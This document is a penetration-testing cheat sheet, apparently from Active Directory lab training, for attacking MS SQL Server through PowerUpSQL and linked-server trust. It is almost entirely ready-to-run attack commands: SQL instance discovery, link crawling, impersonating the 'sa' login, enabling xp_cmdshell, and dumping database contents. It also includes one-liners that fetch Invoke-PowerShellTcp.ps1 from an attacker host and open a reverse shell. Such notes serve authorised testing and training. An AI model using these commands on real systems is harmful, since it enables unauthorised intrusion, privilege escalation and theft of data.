## Trust abuse SQL
- Could be possible cross domain or cross forest!
```
. .\PowerUpSQL.ps1
```
### Check connections
#### Discovery of SQL instances (SPN scanning)
```
Get-SQLInstanceDomain
```

#### Check accessibility to SQL servers
```
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded –Verbose
```

#### Gather information
- If connection succes! Connect to the DB with heidiSQL and look in it!
```
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

### Database links
#### Search for links to remote servers
```
Get-SQLServerLink -Instance <SQL INSTANCE> -Verbose
```

#### Crawl links to remote servers
```
Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> -Verbose
```

#### Crawl links and show servers where we are sysadmin
```
Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> | Where-Object -Property sysadmin -Match 1
```

#### Crawl and try to use xp_cmdshell on every link
```
Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> -Query 'exec master..xp_cmdshell ''whoami'''
Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> -Query 'exec master..xp_cmdshell ''whoami''' | Where-Object CustomQuery
```

### Audit
#### Audit for issues
```
Invoke-SQLAudit -Verbose -Instance <SQL INSTANCE>
```

### Exploitation
#### Impersonation attack
#### Check if impersonation is possible
```
Invoke-SQLAuditPrivImpersonateLogin -Instance <SQL INSTANCE> -Verbose -Debug -Exploit
```

#### Check for impersonation through link
```
Get-SQLServerLinkCrawl -Instance <INSTANCE> -Verbose -Query 'SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = ''IMPERSONATE'''
```

#### Check if impersonation is possible
```
-- Find users that can be impersonated
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
```

#### Impersonate a user
- Might be possible to impersonate user a and then user b and then sa!
```
-- Verify you are still running as the normal user login
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
-- Impersonate the sa login
EXECUTE AS LOGIN = 'sa'
-- Verify you are now running as the sa login
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```

#### Enable and run xp_cmdshell
```
-- Enable show options
EXEC sp_configure 'show advanced options',1
RECONFIGURE
GO
-- Enable xp_cmdshell
EXEC sp_configure 'xp_cmdshell',1
RECONFIGURE
GO
-- Quickly check what the service account is via xp_cmdshell
EXEC master..xp_cmdshell 'whoami'
```

### Command execution
#### Execute commands
```
Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> -Query "exec master..xp_cmdshell 'whoami'"
Invoke-SQLOSCmd -Instance <SQL INSTANCE> -Verbose -Command "Whoami" -Threads 10
```

#### Execute command through links
```
select * from openquery("192.168.23.25",'select * from openquery("db-sqlsrv",''select @@version as version;exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''''http://192.168.100.X/Invoke-PowerShellTcp.ps1'''')"'')')
```

#### Execute reverse shell example
```
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'Powershell.exe iex (iwr http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1 -UseBasicParsing);reverse -Reverse -IPAddress xx.xx.xx.xx -Port 4000'"
```

### Data exfiltration
```
#When able to connect directy to the instance
Get-SQLDatabase
Get-SQLTable
Get-SQLColumn
Get-SQLQuery -Query "use <DATABASE>; SELECT * from <TABLE>"

#Through links
List databases
Get-SQLServerLinkCrawl -Instance <INSTANCE> -Query 'SELECT name FROM master..sysdatabases;' | Where-Object customquery | Select-Object instance, customquery -ExpandProperty customquery | Select-Object instance, name

List tables
Get-SQLServerLinkCrawl -Instance <INSTANCE> -QueryTarget AC-DBBUSINESS -Query "SELECT name FROM <DATABASE>..sysobjects WHERE xtype = 'U'" | Select-Object -ExpandProperty customquery

List columns

List the contents of table
```

### Commands
#### Check if current user is sysadmin
```
SELECT IS_SRVROLEMEMBER('sysadmin')
```

#### Check if a user is sysadmin
```
SELECT IS_SRVROLEMEMBER('sysadmin','<USER>')
```

#### List all sysadmins
```
SELECT   name,type_desc,is_disabled FROM     master.sys.server_principals  WHERE    IS_SRVROLEMEMBER ('sysadmin',name) = 1 ORDER BY name